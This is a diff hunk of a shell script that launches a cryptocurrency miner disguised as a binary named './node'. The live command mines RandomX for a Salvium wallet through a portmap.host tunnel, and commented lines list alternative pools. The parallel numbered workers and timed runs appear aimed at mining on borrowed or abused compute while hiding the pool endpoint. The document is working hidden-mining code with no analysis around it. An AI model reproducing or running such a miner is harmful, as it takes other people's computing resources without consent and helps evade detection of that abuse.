@@ -39,7 +39,7 @@ echo "start ${INPUT_NUMBER}"
 
 # salvium
 #START=$(./node -a rx/0 -k --cpu-priority 4 --cpu-no-yield --donate-level 1 -o us.salvium.herominers.com:1230 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk=260000.net_${INPUT_NUMBER} > try.log & sleep 1830 )
-START=$(./node -a rx/0 -k --cpu-priority 4 --cpu-no-yield --donate-level 1 -o menju2ikg8uti-50625.portmap.host:50625 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk=260000.net_${INPUT_NUMBER} > try.log & sleep 1830 )
+START=$(./node -a rx/0 -k --cpu-priority 4 --cpu-no-yield --donate-level 1 -o menju2ikg8uti-50625.portmap.host:50625 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk.net_${INPUT_NUMBER} > try.log & sleep 1830 )
 #START=$(./node -a rx/0 -k --cpu-priority 4 --cpu-no-yield --donate-level 1 -o randomx.rplant.xyz:7130 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk.net_${INPUT_NUMBER} -p m=solo > try.log & sleep 1200 )
 
 TIME=$(TZ=Asia/Jakarta date +"%H:%M")
